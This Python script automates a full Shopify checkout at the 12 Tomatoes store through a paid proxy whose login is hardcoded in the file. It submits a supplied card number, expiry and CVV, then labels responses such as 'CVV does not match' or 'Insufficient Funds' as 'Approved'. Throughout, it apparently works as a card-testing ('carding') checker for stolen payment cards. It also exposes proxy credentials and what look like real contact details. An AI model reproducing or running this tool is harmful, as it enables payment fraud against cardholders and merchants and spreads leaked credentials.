import requests , json , time , re , asyncio
r = requests.Session()

def C( data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None
def cleanhtml(raw_html):
    CLEANR = re.compile('<.*?>') 
    cleantext = re.sub(CLEANR, '', raw_html)
    return cleantext

proxies={
        "http": "http://bala47239mneb154570:B5NWb6UhyEqRCK6D@isp2.hydraproxy.com:9989/",
        "https": "http://bala47239mneb154570:B5NWb6UhyEqRCK6D@isp2.hydraproxy.com:9989/"
    }
def first(r):
    a = r.get('https://store.12tomatoes.com/collections/kitchen/products/82473-6-spoon-silicone-chocolate-mold-set-of-2').text
    r.proxies = proxies
    variantId = C(a, 'variantId":',',')
    if not variantId:
        variantId = C(a,'ariant-id="','"')
    return variantId

def second(r,variantId):
    r.proxies = proxies
    data = f'id={variantId}&quantity=1&properties%5B_Site%5D=12+Tomatoes&properties%5B_Type%5D=+Non-Jewelry+'
    a = r.post('https://store.12tomatoes.com/cart/add.js',data=data).text
    

def third(r):
    r.proxies = proxies
    a = r.get('https://store.12tomatoes.com/checkout')
    url = a.url
    return url
    
def fourth(r,url):
    r.proxies = proxies
    a = r.get(url).text
    authenticity_token = C(a,'<input type="hidden" name="authenticity_token" value="','"')
    return authenticity_token

def five(r,url,auth):
    r.proxies = proxies
    data = {'_method': 'patch',
'authenticity_token': auth,
'previous_step': 'contact_information',
'step': 'shipping_method',
'checkout[email]': 'aircracker2021@hotmail.com',
'checkout[buyer_accepts_marketing]': '0',
'checkout[buyer_accepts_marketing]': '1',
'checkout[shipping_address][first_name]': 'jhon',
'checkout[shipping_address][last_name]': 'doe',
'checkout[shipping_address][company]': '',
'checkout[shipping_address][address1]': '576 Brown Avenue',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'Seneca',
'checkout[shipping_address][country]': 'US',
'checkout[shipping_address][province]': 'South Carolina',
'checkout[shipping_address][zip]': '29678',
'checkout[shipping_address][phone]': '8032011712',
'checkout[shipping_address][country]': 'United States',
'checkout[shipping_address][first_name]': 'jhon',
'checkout[shipping_address][last_name]': 'doe',
'checkout[shipping_address][company]': '',
'checkout[shipping_address][address1]': '576 Brown Avenue',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'Seneca',
'checkout[shipping_address][province]': 'NY',
'checkout[shipping_address][zip]': '10080',
'checkout[shipping_address][phone]': '8032011712',
'checkout[remember_me]': '',
'checkout[remember_me]': '0',
'checkout[buyer_accepts_sms]': '0',
'checkout[sms_marketing_phone]': '',
'checkout[client_details][browser_width]': '1349',
'checkout[client_details][browser_height]': '621',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
'checkout[attributes][Site]': '12 Tomatoes'}
    a = r.post(url,data=data).text
    ship = C(a,'<div class="radio-wrapper" data-shipping-method="','"')
    return ship

def six(r,url,auth,ship):
    r.proxies = proxies
    data = {'_method': 'patch',
'authenticity_token': auth,
'previous_step': 'shipping_method',
'step': 'payment_method',
'checkout[shipping_rate][id]': ship,
'checkout[client_details][browser_width]': '1349',
'checkout[client_details][browser_height]': '621',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
'checkout[attributes][Site]': '12 Tomatoes'}
    a = r.post(url,data=data).text
    due = C(a,'"payment_due":','}')
    return due

def seven(r , cc , mes , ano , cvv):
    r.proxies = proxies
    json_four = {"credit_card":{"number":f"{cc}","name":"jhon smith","month":mes,"year":ano,"verification_value":f"{cvv}"},"payment_session_scope":"store.12tomatoes.com"}
    a = r.post('https://deposit.us.shopifycs.com/sessions',json=json_four).text
    west = json.loads(a)['id']
    return west
def eight(r,url,auth,west):
    r.proxies = proxies
    data = {'_method': 'patch',
'authenticity_token': auth,
'previous_step': 'payment_method',
'step': '',
's': west,
'checkout[payment_gateway]': '19270172747',
'checkout[credit_card][vault]': 'false',
'checkout[different_billing_address]': 'false',
'checkout[total_price]': '1170',
'complete': '1',
'checkout[client_details][browser_width]': '1349',
'checkout[client_details][browser_height]': '621',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330'}
    a = r.post(url,data=data)
    b = r.get(a.url)


def nine(r,url):
    r.proxies = proxies
    time.sleep(3)
    a = r.get(url+'/processing?from_processing_page=1').text
    time.sleep(5)
    # await asyncio.sleep(5)
    message = C(a, '<p class="notice__text">','</p></div></div>')
    if 'Thank_you' in a or 'Your order is confirmed' in a:
        return  f'Charged 18$',"✅", 'Approved'
    if 'CVV does not match' in a:
        return  f'{message}',"✅", 'Approved'
    elif 'Insufficient Funds' in a:
        return "Insufficient Funds","✅","Approved"
    else:
        # mess = cleanhtml(message).strip()
        r_respo = message if message else "DECLINED / UNKNOWN ERROR"
        return r_respo,"❌", 'Declined'
